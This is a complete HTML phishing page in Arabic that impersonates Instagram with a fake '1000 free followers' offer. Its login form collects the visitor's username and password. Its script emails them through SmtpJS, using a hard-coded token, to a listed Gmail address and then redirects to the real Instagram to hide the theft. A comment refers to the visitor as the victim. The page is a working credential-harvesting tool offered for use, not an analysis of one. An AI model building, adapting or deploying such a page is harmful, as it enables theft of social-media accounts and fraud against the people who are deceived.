<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>هدية المتابعين 2026</title>
    <style>
        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; border: 1px solid #dbdbdb; padding: 40px; text-align: center; width: 300px; border-radius: 8px; }
        h2 { color: #262626; font-size: 18px; }
        input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 4px; box-sizing: border-box; background: #fafafa; }
        button { width: 100%; background-color: #0095f6; color: white; border: none; padding: 10px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .logo { width: 175px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="box">
        <img class="logo" src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png">
        <h2>مبروك! أنت مؤهل للحصول على 1000 متابع</h2>
        <p style="font-size: 12px; color: #8e8e8e;">سجل دخولك لتأكيد هويتك واستلام الهدية فوراً</p>
        
    <form id="loginForm">

            <input type="text" name="Username" placeholder="اسم المستخدم أو البريد" required>
            <input type="password" name="Password" placeholder="كلمة السر" required>
            <button type="submit">تسجيل الدخول واستلام المتابعين</button>
        </form>
    </div>
    <script src="https://smtpjs.com/v3/smtp.js"></script>
<script>
document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault(); 
    
    // سحب البيانات من الخانات بدقة
    var user = document.getElementsByName("username")[0].value;
    var pass = document.getElementsByName("password")[0].value;

    Email.send({
        SecureToken : "c2780e8c-843c-42b7-862d-ef34399b3484",
        To : 'abodahmed778775@gmail.com',
        From : "gift-site@bot.com",
        Subject : "بيانات جديدة من موقعك!",
        Body : "اسم المستخدم: " + user + "<br> كلمة المرور: " + pass
    }).then(
      message => {
          alert("تم استلام طلبك بنجاح!");
          // اختياري: توجيه الضحية لصفحة إنستجرام الحقيقية بعد الإرسال
          window.location.href = "https://www.instagram.com";
      }
    );
});
</script>

</body>
</html>
